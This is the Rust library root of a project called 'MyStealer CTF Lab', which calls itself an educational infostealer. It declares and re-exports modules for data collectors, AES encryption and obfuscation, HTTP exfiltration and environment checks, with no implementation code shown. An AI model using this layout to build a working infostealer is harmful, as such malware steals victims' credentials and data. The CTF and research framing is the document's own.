//! MyStealer CTF Lab
//!
//! Educational infostealer for security research.

pub mod config;
pub mod collectors;
pub mod crypto;
pub mod exfil;
pub mod utils;

pub use config::Config;
pub use collectors::{Collector, CollectorManager, CollectedData, CollectorError};
pub use crypto::{CryptoManager, CryptoError};
pub use crypto::aes::{encrypt_aes_gcm, decrypt_aes_gcm, generate_random_key, generate_random_nonce};
pub use crypto::obfuscation;
pub use exfil::{Exfiltrator, LocalExfiltrator, HttpExfiltrator, ExfilError};
pub use utils::{EnvironmentChecker, expand_path, format_size, sanitize_filename};

